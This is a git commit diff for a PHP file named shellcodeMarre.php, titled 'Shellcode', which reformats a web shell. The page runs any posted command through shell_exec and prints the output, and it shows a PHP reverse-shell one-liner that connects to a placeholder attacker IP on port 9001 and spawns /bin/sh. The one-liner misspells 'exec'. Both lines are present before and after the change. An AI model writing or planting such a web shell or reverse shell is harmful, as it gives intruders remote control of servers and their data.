6b302a3ca3c8a5594f0fb2cf0365faff106f25d0
test <test@test.com>
2021-04-19 10:48:15 +0200

    Shellcode

--- shellcodeMarre.php
+++ shellcodeMarre.php
@@ -5,20 +5,19 @@ $output = shell_exec($command);
 
 <html>
 <script>
-window.onload = function () {
+    window.onload = function() {
         var current_url = window.location.href;
         document.myform.action = current_url;
 
-}
+    }
 </script>
+<pre>marrekanin Shellcode</pre>
 
-<p>hello there </p>                                                                                                                                                                                                                        
-                                                                                                                                                                                                                                           
-<p>php -r '$sock=fsockopen("[your ip]", 9001);excec("/bin/sh -i <&3>&3 2>&3");'</p>                                                                                                                                                        
-<form method="post" name="myform"  action="">                                                                                                                                                                                              
-    <input name="command" value="" style="width:500px;">                                                                                                                                                                                   
-    <input type="submit" name="run command" value="Run">                                                                                                                                                                                   
-</form>                                                                                                                                                                                                                                    
-<?php echo "<pre>$output</pre>"; ?>                                                                                                                                                                                                        
-                                                                                                                                                                                                                                           
-</html> 
+<p>php -r '$sock=fsockopen("[your ip]", 9001);excec("/bin/sh -i <&3>&3 2>&3");'</p>
+<form method="post" name="myform" action="">
+    <input name="command" value="" style="width:500px;">
+    <input type="submit" name="run command" value="Run">
+</form>
+<?php echo "<pre>$output</pre>"; ?>
+
+</html>
